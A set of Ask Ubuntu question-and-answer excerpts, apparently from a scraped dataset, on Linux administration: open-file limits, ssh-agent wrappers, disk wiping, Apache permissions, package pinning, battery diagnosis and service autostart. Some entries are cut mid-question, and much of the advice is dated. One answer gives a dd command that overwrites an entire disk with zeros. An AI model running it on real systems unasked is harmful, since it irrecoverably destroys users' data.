Will that be any problem? Will it cause instability?\nThanks.\n\nA: max-open is number of files one user can keep open in single session simultaneously.\n\nAlso, please note that all limit settings are set per login. They are not global, nor are they permanent; existing only for the duration of the session.\n\n(from man limits.conf(5))\nSafe value for maximum number of really depends on your usage. Point with default values is to prevent trivial (accidental) denial of services. There is also global limit for number of open files:\ncat /proc/sys/fs/file-max\n\nYou can change that number by running for example\necho 100000 > /proc/sys/fs/file-max\n\n(with user root, obviously). Even better is to also add line fs.file-max = 10000 to /etc/sysctl.conf to load same setting after reboot.\n\nAs of ulimit: it's safe to increase that number. However, number of open files should not exceed global file-max, because then opening new files is not possible anymore (and for example logging in requires opening files).\nIf there is multiple users, remember that if you change the default, everyone can open more files. For example 30 users * 5000 files = 150 000 open files (assuming that everyone opens maximum number of files, and uses only single session). If you have some really resource hungry (as in opens really many files) software used by multiple users, it might be a problem.\n", "Q: Can't find Windows after installing Ubuntu I know questions like this have been asked before, but this is a bit different. I told it to install Ubuntu on the Partition that had Windows on it. After that, I couldn't start windows anymore. Can anyone help me?\n\nA: Indeed your question is different.

When I'm running Gnome, ssh-agent will run ssh-add upon slogin/ssh if the identity is not loaded.  I want to mimic this behavior on remote shells, but everything I find suggests to run ssh-add upon login.  I only want to run ssh-add if I subsequently run slogin/ssh on the remote shell, not every time I login.\n\nA: I worked out a solution for this via the bash shell.\nAdd to .bashrc:\ncheck-ssh-add() {\nif [ \"$DESKTOP_SESSION\" == \"\" ]; then\n  if [[ `ssh-add -l` != *id_?sa* ]]; then \n    ssh-add -t 5h  ## 5 hour ssh-agent expiration\n  fi\nfi\n}\n\nslogin() {\ncheck-ssh-add\n/usr/bin/slogin $@\n}\n\nssh() {\ncheck-ssh-add\n/usr/bin/ssh $@\n}\n\nscp() {\ncheck-ssh-add\n/usr/bin/scp $@\n}\n\nsftp() {\ncheck-ssh-add\n/usr/bin/sftp $@\n}\n\n\nA: There's actually an even simpler way. ssh-add -l returns true (0) if there are keys and false (1) otherwise, so your first function can be replaced with this:\ncheck-ssh-add() {\n  if ! ssh-add -l >/dev/null; then\n      ssh-add -t 5h\n  fi\n}\n\n \n\nA: Even simpler in the «this is an interactive session» part add\nssh-add -l &> /dev/null || ssh-add ~/.ssh/my_id\n\n\nA: Newer versions of OpenSSH can add the key to the agent on first use, if you enable AddKeysToAgent yes in your ~/.ssh/config.\n(I've learned this from https://superuser.com/a/1114257/42546.

I saw somewhere that things here can't have dots in the filename, so the symlink has the .py extension removed (the original file still has it).\nThe python file does have #!/usr/bin/python on the first line.\nThis is my first experience with cron / anacron, and so I'm sure I'm making a dumb mistake - I just don't know what it is. Is a symlink a problem? Do I need the actual file there? Is the python script the problem? Do I need to run a bash script that will open the python script? Is there something else I'm not thinking of?\n\nA: Dumb question, but is your script executable? Right click on file and then Properties. In Permissions tab ther should be checkbox to set script as executable.\n", "Q: Can I present a powerpoint presentation with sound? It is possible to demonstrate .PPT with audio under Ubuntu?\nexample such of .ppt - it is short tales for kids\n\nA: It should* work, since Ubuntu's Open Office (and the new libre office) have multimedia support. If you have problems with the audio you should add the details to your question.\nAfter trying to playback this file I found a number of problems. Firstly the slide transitions were not actually set. Secondly the media file plays if I manually play it in the editor, but not if I start the slide show (not sure why, but it doesn't load).\nI would suggest editing the slideshow in OpenOffice and adding buttons that play back the audio on a click, as well as actually adding slide transition properties (otherwise it will just change the slides rapidly).\nBTW - You should not be getting this problem, try recreating the slide show as an impress slide show (just reuse the images etc) and add the details of if it works then to your question.\n - *(I say should instead of will because your question doesn't have the detail of whether you have tried it or not)\n", "Q: strlen returns incorrect value when called in gdb So I'm noticing some severely incorrect behavior from calls to standard library functions inside GDB.

Build glibc from source? (I'm already running a version of GDB built from source)\n\nA: The library is working just fine.  The program reports the correct value even when run under gdb.  The bug seems to be in the way that gdb is evaluating the expression and forcing the target program to call the function.  I'm seeing this same behavior on 10.04 as well.  Strangely p printf(\"foo\\n\") correctly prints 4.\nIt seems that gdb is confused because strlen is a builtin.  If you do this:\nint (*len)(char *) = strlen;\nAnd then have gdb print len(\"foo\") you get the correct result.\n\nA: This is a known bug in eglibc apparently.

This way, GRUB will be updated or installed as required.\n\"Use the entire disk\" which will physically erase the whole disk in order to use all its space for the new OS install.\nIf what you wish is to use the hard disk drive for a data tasks such as BackUp or other data handling, you can achieve that by first erasing the whole partition and do it from scratch. Formatting the disk will also do the trick. \nSeveral tools will help you to achieve this task in Linux and other OS's.\nIn Maverick, under \"system/administration\" you will find a \"Disk Utility\", inside of which you will find a disk drive and other devices tree on the left and its characteristics and tool list in the right side, where you can find both \"Delete Partition\" and \"Format Drive\" options.\nYou can do this from a Live Session.\nA screenshot is placed here for your convenience.\n\n\nA: if you do a fresh install, and you select \"Use the entire disk\" (the most common, and most used option) assuming that you are not needing to dual boot. The installer will automatically delete all the previous partitions, and repartition it as needed. If you are using the latest stable version of Ubuntu, it will format it to Ext4.\nYou really don't have to dig into any disk utilities unless you really want to, as they will just complicate things or make more work for you. Just let the installer do what it needs to do and it will be fine.\n\nA: If you boot a live cd (any distro) you can use: dd if=/dev/zero of=/dev/sda This assumes that your disk is the first SATA disk and will write the while disk with 0's, this will take some time.  You could alternatively use /dev/urandom instead of /dev/zero to fill it with random data.\n\nA: Disk utility is a nice idea but you cannot format a mounted drive and if you only have one disk it will be mounted also you can't unmount it because its in use. So this is not an option for single disk.\n", "Q: How do I script an install?

Using Maverick, I am not able to get the CapsLock behaviour I want: I would like it to affect essentially the alphabetical, numerical, and punctuation keys, i.e. all the keys that print something (as opposed to, say, the arrow keys), but only them. \nTo illuminate this with an example: when writing code that uses % as the symbol for a comment, I want to be able to position the cursor at the start of a range of lines I want to comment out, then hit CapsLock, then iteratively hit the 5 key (using QWERTZ, Shift+5 gives %) and the arrow down key, so that I can quickly place a % at the start of the lines. \nUbuntu in default configuration takes CapsLock literally, so that it affects only alphabetic keys. Under Preferences/Keyboard/Layout/Options I can make it act as a pressed Shift, but then the action of the arrow keys is to select text. All the other options available are equivalent to one of these two in my case.\nIs it possible to somehow get this behaviour? This is standard in Windows.\nEdit: @Mikel: I use English language with German keyboard layout. Yes, by googling I found out about this Belgian problem and the fix, but I hoped that there was an easier way, as I just want the Windows behaviour.

Does anyone know what changes are coming?\n\nA: The short answer is: Lots.\nOfficial:\nAs a kernel is released, though not before, all of the changes are written up in the Changelog: http://www.kernel.org/pub/linux/kernel/v2.6/ \nYou'll notice they are published for each minor release. They contain absolutely everything, and are almost impossible to read, if you're not into all things kernel. :-)\nNot official:\nI usually read The H's summary of changes to the kernel. They've summarised all of the changes that you'll see in Natty quite well.

I already tried changing the chmod of the symlink (which changes the ones from the original file of course) and also a chown to the user from webserver, but no matter what I tried I cannot open the file from the web or from a php-script (which is what I want to do)\nCan anybody help me and tell me what I need to do? What rights do I need to give? Or is there another way of achieving this?\n\nA: The symbolic link will always have these permissions: lrwxrwxrwx. The \"l\" indicates that it is a link. Therefor, all users can follow the link because the effective permissions are those of the file to which the link points. It is never useful to try changing the permissions of a symbolic link.\nThe whole path from the root to the file in question must be readable by the Apache user.  So... take a look the permissions of the home folder:\nls -la /\n\nThe home directory should be owned by root, group owned by root, with 0755 permission mask by default: drwxr-xr-x. If not, change it:\nsudo chown root:root /home; sudo chmod 0755 /home\n\nNow take a look at your user's directory:\nls -la /home\n\nIf the username in question is sambo, the user's home directory should be owned by sambo, group owned by sambo, with 0755 permission mask by default: drwxr-xr-x. If not, change it:\nsudo chown sambo:sambo /home/sambo; sudo chmod 0755 /home/sambo\n\nRepeat this as many times as needed, for however many directories exist until you reach the directory that contains the file. Then, don't forget about the file itself.\nsudo chown sambo:sambo /home/sambo/path/to/file/file.txt; sudo chmod 0644 /home/sambo/path/to/file/file.txt\n\nThen use PHP to open it:\n<?php\n    $file = '/home/sambo/path/to/file/file.txt';\n    $fp = fopen($file, 'r');\n\nYou could use the symbolic link at this point, too.\n\nA: I was able to access files from my system with mediatomb (see the documentation) as it has a web UI. I would recommend enabling password protection at least.\nAnother alternative is opera unite web server.\n", "Q: No audio after clean installation I did a clean install of Ubuntu 10.10, and I have no audio.

My wireless adapter's driver is proprietary, and for a minimal install, I need a command to install it. A general command for any other restricted driver that I may come across in the future would also be extremely helpful.\n\nA: You can run jockey-text, which is the command line equivalent of the \"Additional Drivers\" GUI tool.\njockey-text -h will show you the options available.\n\nA: jockey-text -l\n\nshows what drivers are available\njockey-text -e <type:name>\n\nenables a driver.

Is this possible in Ubuntu (10.04, I suppose)?\n\nA: The best resource I know of for explaining the different ways to accomplish this kind of package hold is on the Ubuntu Pinning How-to page .  I really recommend checking it out.   It describes several ways to do this in addition to using the Synaptic lock as andrew has detailed. \nThere are solutions to closely related problems in several threads on askubuntu. \nIs There a Way to Disable Kernel Updates?\nBlacklisting Packages from Installing\nHow to Prevent Package Removal Upon Upgrade\nHow to Remove a Package from the List of Packages to be Installed\nHow Do I Pin a Particular MySQL Version to Avoid Unnecessary Upgrade\n\nA: As your question is tagged synaptic, I'll assume that this you package manager of choice. In order to hold a package back with synaptic, you simply need to \"lock the version.\" \nFind and select the package you wish to hold back. Then go to Package > Lock Version in the menu bar.\n\nWhen you are ready to upgrade that package, simply highlight the package and un-check \"Lock Version.\" It can now be upgraded normally.\nIf you like to do this from the command line, you can use dpkg --set-selections\necho package_name hold | sudo dpkg --set-selections\n\nTo remove the hold, run:\necho package_name install | sudo dpkg --set-selections\n\n", "Q: Brand new battery is 100% charged but at 0% capacity I just bought a brand new battery to replace one that had seemingly died. I followed the instructions that came with the battery and charged it overnight, then ran my computer on battery until it was in a critical state and charged it overnight again. Now the battery appears to be 100% charged and at the same time at 0% capacity—when it's plugged in  it doesn't charge and when it's unplugged the computer immediately goes into low power mode.\nI've taken the battery out and checked the contacts. I've rebooted the system with and without the battery. Nothing seems to help.\nI'm not sure if I should blame the battery, the laptop, the charger, or the power management software for this state of affairs. The obvious answer would be the battery but I bought this battery because another year-old battery exhibited similar behavior—I assumed it was dead and a Dell tech came to the same conclusion. I'm loathe to order another new battery without first exploring other explanations.\nWhat can I do to diagnose this problem?\nHere's the /proc info:\n$ cat /proc/acpi/battery/BAT0/state\npresent:                 yes\ncapacity state:          critical\ncharging state:          charged\npresent rate:            1 mA\nremaining capacity:      0 mAh\npresent voltage:         9754 mV\n\n$ cat /proc/acpi/battery/BAT0/info\npresent:                 yes\ndesign capacity:         6600 mAh\nlast full capacity:      6789 mAh\nbattery technology:      rechargeable\ndesign voltage:          11100 mV\ndesign capacity warning: 660 mAh\ndesign capacity low:     200 mAh\ncycle count:          0\ncapacity granularity 1:  66 mAh\ncapacity granularity 2:  66 mAh\nmodel number:            DELL WK\nserial number:           4043\nbattery type:            LION\nOEM info:                SMP\n\n[UPDATE] It turned out to be the AC adapter. I find it very strange that a faulty adapter can cause the charging state to be \"charged\" on an empty battery.\nI'll still up-vote answers that give good debugging strategies for this situation—swapping out the battery and adapter, in turn, is obvious but one doesn't always have a spare battery or adapter around to play with. As noted below, Dell was actually prepared to send a technician to my house to replace the motherboard, which would have been a phenomenal waste of time and money.\n\nA: You can see from the voltage and current readings that the battery is not being charged.  My Dell laptop has a blue battery icon on the F2 key and if I press Fn+F2, it will enable/disable charging.  If you have a key like that try pressing it and see if it starts charging.\n\nA: Almost definitely this is a problem with the battery. If you have windows you can confirm this on windows as well. I ran into the same issue with a new battery of mine (even though it reports an incorrect percentage, and in doing some research, I found out that it is simply a common problem with LiON batteries :( - if they get too hot, are charged too long, or any other mixture of random silly reasons, they exhibit this exact behavior -- reporting an incorrect charge state to the system.\n\nA: This happened on my dell inspiron 1525 with a newer but not brand new battery. I have already replaced the AC adapter a year or so ago due to battery charging issues.\nThis time around after running the battery down to 0% it would not charge (gave the battery 100% at 0% capacity)\nI went to the bios setup and checked the battery and ac adapter status and the ac adapter said \"unknown\". After unplugging and plugging back the adapter it then recognized the adapter as '90 mA'.\nThe adapter not being recognized seems to be a common dell issue, a side effect related to fending off cheap imitations and unlicensed replacement parts:\nhttp://search.dell.com/results.aspx?c=us&l=en&s=gen&cat=cmu&k=inspiron+1525+power+adapter\nAnyway after going to boot ubuntu, the battery status went back to charging.\nHope this helps...\n", "Q: Youtube videos do not load completely Videos on YouTube load for a few seconds and then it shows that it has completely loaded but not really. The video plays for some seconds and then stops and doesn't load any more. What's going on?\n\nA: I would start by finding out which version(s) of flash (or flash alternatives are installed).\n$ dpkg -l | egrep \"flash|gnash|swf\"\n\nAlso check if was installed manually (some 64-bit users do this):\n$ find ~/.mozilla | grep -i flashplugin.so\n\n\nA: There is an old bug with flash and sound buffer. Videos are usually loaded OK, but as soon as the sound buffer is full videos will pause (usually around 3-4 seconds). \nTry skipping through video to check if it starts playing again for 3-4 seconds. If it does you have to upgrade your flash and ALSA (probably use newer ubuntu version), if it doesn't then check your available disk space.\n\nA: I have figured out over time that flash tends to have problems it crashes and refuses to play certain videos on youtube what i done to fix this issue several months ago was  sudo apt-get install gnash installing Gnash becomes default over flash\n", "Q: Ruby compilation error in Ubuntu 10 I've got a vps which runs solusVM.

Having to use that generally means something is already broken.   You should probably start again from the beginning, making sure each step completes. \nHowever, I don't think you need to do any of this. \nUbuntu's ruby1.9.1 package actually provides Ruby 1.9.2 . \nIf you look at the details in the output of `apt-cache show ruby1.9.1, you will find that the version provided in Ubuntu is actually 1.9.2. \nIt is listed as 1.9.1, because the Debian maintainer is meaning to describe the binary compatibility version (1.9.1), instead of the Ruby software version (1.9.2) . \nSee this Debian bug list entry for more information.\nHere are a few snippets of the apt-cache show ruby1.9.1 output : \nPackage: ruby1.9.1\nVersion: 1.9.2.0-1\nFilename: pool/universe/r/ruby1.9.1/ruby1.9.1_1.9.2.0-1_i386.deb\n[...]\nDescription: Interpreter of object-oriented scripting language Ruby 1.9.2\n Ruby is the interpreted scripting language for quick and easy\n object-oriented programming.

Is there a modern (I mean excluding Ext2/3 as they are obsolete for general usage when there is Ext4 today) free-born (I mean excluding FAT and NTFS) file system working equally good in Ubuntu and Windows (maybe after installing some extra drivers) (or any active project of such)? \n\nA: There's the Universal Disk Format.\nBut Ubuntu/Gnome/udev doesn't support it much outside of DVDs. And Windows might not run it from ordinary partitions either without helper tools.

I've got a dual-boot system, having WindowsXP-NTFS and Ubuntu-Ext4 partitions. It would be cool if I could use the same bookmarks database in Firefox under Linux and Windows.\nHow to achieve this? What files should I link and is this expected to work any stable?\nPlease no web service-based solutions. I have had this idea but prefer my browser data to be stored locally.\n\nA: Try Xmarks - even though it stores your bookmarks on a server to synchronise with each browser it is installed on (available for Firefox, Chrome and Internet Explorer) you also have the local data in the browser installation folder\n\nA: Firefox stores your bookmarks in a database file places.sqlite under your profile \nfolder. Because the database filename appears to be hardcoded, it's probably not designed to be moved to a different location.\nInstead of trying to share just your bookamrks, why not share your entire Firefox profile between Ubuntu and Windows? Leave your profile folder on Windows, then update profiles.ini on Ubuntu to point to your Firefox profile folder under Windows. I've had good experience transferring Mozilla profiles across OSes, although YMMV. Whatever you do, be sure to make a backup copy of your profile folders before you do anything.\nGoogle shows that some people have had success with this setup. See this HowTo, for example. It looks like certain extensions might have issues doing this, though.\n", "Q: Where do I file bugs for the Ubuntu One music client for Android?

I want to install something Debian-based, now I have pre-installed SLED 11 SP1, Laptop HP 4520s.\n\nA: If you want stability to the point of using somewhat old Linux technology, then Debian is for you - it's virtually bug-free. But if you want to enjoy newer technology with a good guarantee of stability, go for 10.04.\nBe warned, if you're opting for Debian, getting latest packages will be no easy feat. Their repo will be full of thoroughly tried and trusted outdated packages, so if you want the latest not-thoroughly tried and tested by Debian, you need to compile and install them by yourself.\n\nA: Definitely go with Ubuntu for your user / development environment.

Selecting either of these commands leading to the same result - after some background work the main loading indicator is displayed (\"Ubuntu\" text with dotted progress bar under it), and it's progressing forever without any effect.\n\n\nIs Ubuntu 10.10 compatible with my Eee PC at all? How to boot it correctly?\n\nA: I had the very same issue as the OP, while trying to install Lubuntu 18.04 LTS. Symptoms include: when you press Esc while the \"Ubuntu text with dotted progress bar\" is displayed, you get to the text-mode boot log. There, I would see something like:\n[190.934709] sd 2:0:0:0: timing out command, waited 180s \n[190.934709] end_request : I/O error, dev sdc, sector 3970032 \n[190.934709] buffer I/O error on device sdc, logical block 496254 \n\nI found the exact same sector and block numbers reported elsewhere, where another user has the same issue of installing on the Asus Eee PC 4G (701). So I thought, these cannot be real block defects on my SD card then, it must be something else. Indeed I was able to successfully boot from the internal SD card reader after the following steps:\n\n\n*\n\n*In BIOS, set up the SD card reader as the first boot device. For that, you first have to configure it in BIOS as the first mass storage device, and the internal mass storage device as the second one. Because only after that, the card reader will appear in the selection list of possible boot devices when changing the boot order.\n\n*In BIOS, set option \"OS Installation\" to \"Finished\". I suspect that the alleged block corruption error message happens when this option is set to \"Start\". The other user with the problem also said he had set this to \"Start\" when the issue happened.\nThe distribution I eventually installed was BunsenLabs Linux version Helium / i386, and it's running nicely. For live usage, it was needed to start it with the \"Live 586 (failsafe)\" option, but with all the no… kernel options removed, as otherwise the touchpad would not work. Once installed, no special kernel options were needed.\nNote also that you can use the regular \"PAE\" version of distributions, no need for a \"non-PAE\" version, but perhaps for the forcepae kernel option (details).\n\nA: I am not familiar with this world at all, but I was sick and tired of not being able to load anything on that piece of crap Xandros distro, so this is my first foray into Ubuntu. I had a usb card reader and a micro sd card which I used for the install and had a heck of a time - no matter how I changed the boot order, I couldn't get it to run the trial or anything. Here's how I got it to work - I ejected the SD card, inserted the usb reader, held down the ESC key, and then turned the computer on. Holding down the ESC gave me the option to choose my boot device, whereas nothing else would. Maybe the problem you are having is trying to run it from the SD card slot. Get a card reader and try that! Good luck!\n\nA: Ubuntu 10.10 hang on boot on many asus laptops: read here\n\nA: I had the same problem installing Ubuntu 10.1 Netbook Remix on my Asus EE PC 701 4G using the \"USB Universal Installer\" from pendrivelinux.com.

As a learning experience, I have written a custom chat application using qt4 and I want to deploy it in some sort of setup file. Whats the easiest way of deploying an application viz a viz\n\n\n*\n\n*setting desktop icons.\n\n*automatically requesting for administrator privileges to execute.\n\n*inserting an entry into the startup menu.\n\n*automatically compress my application and reduce download size.\n\n*automatic startup for my application without user intervention\n\n\nI am familiar with using NSIS scripts on Windows, but I don't know where to begin on Ubuntu. I would preffer a solution similar to NSIS scripts.\n\nA: You should create a .deb package and you could also upload your application to a PPA. Use one of the packaging guides to help you - the QT one should be particularly useful. Also, see this tutorial on Ubuntu Forums.\nIt would be a good idea to create a Launchpad account so that you can create a PPA and also a project page where you can upload your .deb file and source code archive. If you use bzr for version control (which I recommend), you can use Launchpad to manage your code. Launchpad has many other features such as bug management. See: How to start a new project and host it at launchpad.net?.\nAs for your specific points:\n\n\n*\n\n*setting desktop icons\n\n\nDon't. It is bad practice for applications to automatically create icons on the user's desktop. You should, however, create a menu entry for your application so that users can run it from the Applications menu and optionally create a desktop shortcut for it. To do this, you need to write a .desktop file and in your debian/rules file under the binary-indep section, copy it to /usr/share/applications (in debian/tmp).\n\n\n*\n\n*automatically requesting for administrator privileges to execute\n\n\nI hope you mean for the setup file - a chat app has no reason to run as administrator. The .deb file will do this for you - it will open in Ubuntu Software Centre, which will require a password.\n\n\n*\n\n*inserting an entry into the startup menu\n\n\nI don't know what this means. What is the startup menu? If you mean the Applications menu, see 'setting desktop icons'.\n\n\n*\n\n*automatically compress my application and reduce download size\n\n\nThis is done automatically when you create the .deb package - .deb packages are compressed.\n\n\n*\n\n*automatic startup for my application without user intervention\n\n\nI don't know if this is possible but you shouldn't do it anyway. It should be up to the user which applications they want to autostart. This is set through the Startup Applications preferences window.\nOnce you have managed to create a .deb package and uploaded to a PPA, you should consider trying to get your application into the official Ubuntu repositories. Be prepared for a steep learning curve - debian packaging is hard to understand at first, but if you persevere, you will get it eventually.\n\nA: You might want to check the Ubuntu App Developer site, which explains how you can develop an application from creation to distribution, and provides additional resources to help you along the way.\n", "Q: Vim: Move left at the beginning of a line should go to above line In usual text editors, when you move your cursor left at the beginning of a line, the cursor goes up at the end of the above line.

Is there a terminal-command that backups thunderbird's addressbook?\nI would like to set up a cron-entry for that. Note that I only want to back up the address book, not my entire profile. \n\nA: Mozilla Address Book .mab\nBacking up your address books GUI\nIt is recommended that you regularly make backups of all your Thunderbird application data, including mail files, address books, and account settings, so that you can restore your complete profile(s) if it becomes necessary.\nIn addition, you may want to occasionally make separate backups of all your address books by exporting them as LDIF files. That way, if your address books ever happen to become corrupted, you will still have a separate backup that you can import into any Thunderbird profile. To do so, export each address book as an LDIF file using the procedure described above and then burn the LDIF files onto a CD-ROM or store them elsewhere for safekeeping. \nTo export an address book:\n - Open Thunderbird > Tools - Address Book\n\n* In the Address Book window, select the address book that you want to export.\n* Go to the \"Tools\" menu and select \"Export...\".\n* Enter a name for the address book, select \"LDIF\" from the drop-down list, choose where on your computer you want to save the address book, and then click to save the file. \n\nBacking up your address books Command-Line\nYour address book in stored in your profile to know where is it execute :\n\nsudo locate *.mab -> find something like abook.mab\n\n\nA: Yo could use a bash script.

As a former Windows user I was used to accepting EULA's and other licenses when installing any piece of software, or when installing the whole OS. On Ubuntu it happens extremely rarely (I've met it only once). Is it correct? Ubuntu and most of it's software is under some free-to-use-and-modify license like GNU GPL or something similar, but shouldn't the license be presented to the user? \n\nA: I wasn't able to comment on Stefano Palazzo's answer above, but I just wanted to clarify that it's not necessarily true to say that an open source licence isn't a contractual licence. They often are, and it may well be the case that all open source licences are contracts in some jurisdictions.\nBut of course he's right in that there are generally no obligations placed on the user so there is no incentive to get them to accept the contractual licence. Copyright law provides an adequate fallback for any shenanigans, so there really is no need for an open source software developer to inconvenience the user with an unnecessary legal process.\nBy the way, while you're free to not agree with the licence, using the software without a licence will leave yourself open to a copyright claim from the developer. Generally they wouldn't act on it anyway.\n\nA: This is regarding free software:\nA license is very different from a EULA. The software on your computer starts out under the normal (default, in some countries) copyright by the authors. Only then do you get special permission to copy and re-distribute the software under the terms of the GPL. This does not restrict your use of the software, nor does it put any special onus on you to comply with some arbitrary terms. It is not a contract.\nThink of the GPL as an agreement of the terms of re-distribution; you are granted license to deal with the software in ways normally prohibited by copyright law, given you agree to some terms.\nA EULA restricts your use of the software, it has nothing to do with simple copyright. The EULA says, you may use this software, but not in any way you like. It restricts you further than copyright or trademark law could. Free software doesn't have that kind of restrictions, therefore you don't have to agree to any contract. \n\nA: Most people don't read those licenses or EULA's at all, and those who do find it important enough can probably find them through other means (on the software's website, for instance).\nThat's not very user-friendly to them, but it is to most users.\n\nA: The model used on windows is not the norm on most systems. Having used a mac once I was a bit surprised at just how simple installing apps was (much more simple than linux, believe me, but not in a good way). The point is, showing a license for every install is not only annoying, but unnecessary. The license (if really relevant) should be shown when first running the software, or in an about menu, etc.\nFor users switching from windows, adding that extra step would mean another hurdle to understanding linux, which is another good reason why it (the extra step) is not included.\nBTW the software center shows you the license as a string in the info about the software (in a simple way) - that should be enough for most common users.\n\n\nA: Almost every GPL licensed application has GPL license in Help > About dialog. At least KDE apps have one. If you want to read the license, you can do it form help dialog.\n", "Q: Why don't I have to accept a EULA when installing Adobe Flash Player? The Adobe Flash Player has a quite restrictive EULA but it is not presented to the user when he installs it. Isn't the user obliged to accept it, before using it?

I am using VMware Workstation 7. I have the VMware tools and 3D acceleration enabled but when I try to enable desktop effects I get the message \"Desktop effects could not be enabled\". I have an Nvidia GeForce graphic card. And mine is a Dell XPS L501X . \n\nA: Both VMWare and VirtualBox limit the amount of video-RAM available to the guest OS.  As a result, the guest OS will assume that the machine isn't powerful enough to run desktop effects.  Keep in mind that the graphics card that the guest OS sees is what the emulator tells it.  \n\nA: I think desktop effects will not run if it is not a recognized card. In my experienced, trying to run effects in a virtual machine has constantly failed. The reason may be because the video card inside the VM is not based on actual hardware.\nRun this in the VM to check:\n$ lspci | grep -i VGA | awk '{print \"sudo lspci -knn -s \"$1}' | bash\n\n\nA: Desktop effects can be used on the VM install, but the 3d acceleration is software based, not hardware. This basically means that using the 3d effects will significantly slow down your VM.\n", "Q: Why do Back In Time snapshots appear to be so large? I just backed up the contents of my home partition onto my external hard drive using Back In Time. I browsed to the backed up contents in the external drive and under properties it showed me the size as 9.6 GB. \nAs I read that in next snapshots I create, Back In Time does not backup everything but creates hard links for older contents and saves newer contents, I wanted to test it. So I copied two small files into my home partition and ran 'Take Snapshot' again. \nThe operation completed within a minute - first it checked previous snapshot, assessed the changes, detected two new files and synced them. After this when I browsed to the backed up contents, I was surprised to see the newer and older backup taking up 9.6 GB each. \nIsn't this a waste of hard drive space? Or did I interpret something wrongly?\n\nA: It seems that checking properties under context menu is not reliable in such cases. When I used du command it showed right usage. I could get this suggestion from Launchpad's 'Back in Time's' Mr. Dan.\nThis is because backintime uses hard links, where each file is stored once, but makes it look like each copy takes up additional room. For more details please refer to https://answers.launchpad.net/backintime/+question/146072.\n\nA: My guess is that your external hard drive is formatted FAT32 or some other file system that does not support hard links. It also appears that if the partition type containing the file system is not a Linux (0x83) partition, the file system will not properly record the disk consumption of the hard links. If you create a Linux native partition on your external hard disk and format it with a native Linux file system such as ext4 it should work properly.\n", "Q: Disable autostart for a service without uninstalling? How can I disable autostart for a service without uninstalling?  For example, I'd like to leave tomcat installed, but I don't want it turning on every time I restart.\n\nA: More generic and more visual, with a nice UI: sysv-rc-conf\nUncheck the boxes for tomcat7 (runlevels 2 to 5), quit and that's it.\n\nA: The disable|enable API is not stable and might change in the future. I suggest you use the following command to remove all the symlinks in /etc/rc?.d/:\nupdate-rc.d -f tomcat remove\n\n\nA: For upstart jobs, you need to disable service like this (e.g. mysql):\n$ sudo -s\n# echo \"manual\" > /etc/init/mysql.override\n# exit\n\nor using this one-liner:\n$ echo \"manual\" | sudo tee /etc/init/mysql.override > /dev/null\n\n\nA: This should do the trick:\nOpen terminal (Ctrl + Alt + T) and enter the following command:\nsudo update-rc.d tomcat disable\n\nBasically update-rc.d will modify existing runlevel links for the script /etc/init.d/tomcat by renaming start links to stop links.\n", "Q: Kubuntu login problem I have a problem when trying to login to my Kubuntu 10.10.\nThe login screen shows up, then I type my password, a blank screen is shown with my desktop background picture and then throws me back on the login screen.\nif I choose to login from console, I can do that, and by typing startx I can log in just fine but in the end I cannot shutdown the computer from the k menu nor will my settings remembered for the next time I log back.\nI have my home directory mounted from a different partition but I tried to create a new user account and I could log in without any kind of problem.\nThe home directory is not encrypted, at least not to my knowledge.\nSome log files:\n\n\n*\n\n*Xorg.0.log\n\n*dmesg.out\n\n*kdm.log\n\n*xsession.errors\n\nA: In dmesg towards the end \nnpviewer.bin[2448]: segfault at 10 ip 00000000f62abc52 sp 00000000ffa7e310 error 4 in libflashplayer.so[f5e41000+b5f000]\n\nSee the phrase segfault this is a kernel crash and results in the cryptic last line in kdm log ddxSigGiveUp: Closing log meaning the X server doesn't start hence no screen picture. The file causing crash is npviewer.bin. \nCan't really advise how to fix this.\n\nA: It sounds like the problem is some setting/file in your ~/.kde folder, which is causing issues with KDE and nothing else.   One solution would be to rename or delete that folder - this would reset all of your KDE settings to defaults and you could start from scratch.   If you only want to clear out some settings, you can selectively rename or delete various sub-folders in your ~/.kde (most likely anything web browser related) until you find the culprit.\n", "Q: \"GNUTLS ERROR: A TLS packet with unexpected length was received\" when I connect my iPhone 3G Look at the video; the iPhone is supposed to appear as a photo collection of some sort but nothing happens with my iPhone!

I tried to find anything relavant in the gtkrc, but failed. \n\nA: If you refer to the minimize, maximize and close buttons: yes you can.\nYou can download windows border themes from: http://art.gnome.org/themes/metacity in which you will find several different styles for customizing those buttons.\nIf you prefer to use GTK and depending on the theme of your choice, some themes allow you to give a little bit more customization to its items. Simply go to System/Preferences/Appearance and clic on the \"Customize\" button of the \"Theme\" tab.\nThere is also a link which will lead you to the website I suggested above.\nHere is a screenshot for you to see what I mean:\n\nAdditionally, you can use Emerald theme manager in order to have more stylized windows decorations and a little more control on the appearance of the items.\nSimply install emerald and run the emerald --replace command in a terminal in order to change your windows decorator, then open your Emerald Theme Manager on which you will be able to easily manage and edit your themes.\nHere is the Emerald theme manager in action:\n\nIn the next screenshot, I have changed my emerald theme in order to show you how emerald is handling the buttons that I refer (minimize, maximize, close, etc.) And I am showing the \"Buttons\" Tab inside of the \"Edit Themes\" section of emerald theme manager.\n\nFurther more, you can also create your own themes both for GTK and Emerald. You may find information on the related sections of the window decorator's website.\nI hope this give you an idea and I am sorry if I misunderstood your question.\nEDITED:\nWell, after watching your comment now I understand what you mean.\nFor that purpose what you can do is to make a copy of the current png images for the theme you wish to change. \"Ambiance\" png images are inside of the\n\n/usr/share/themes/Ambiance/metacity-1\n\nThis screenshot illustrates what I mean:\n\nSo I suggest you to make a copy of those files in a new folder and edit them using your favorite image manipulation program (gimp would be great) in order to change the hue, saturation and other things as you wish.\nAfter that, drop the images back to the original folder but you will be in the need to run sudo nautilus in a terminal in order to be able to \"paste\" your edited images in the folder. After that you may need to restart (at least the X) in order to the changes to take effect.\nIn the next image I have opened the \"close.png\" png image in order to edit it.

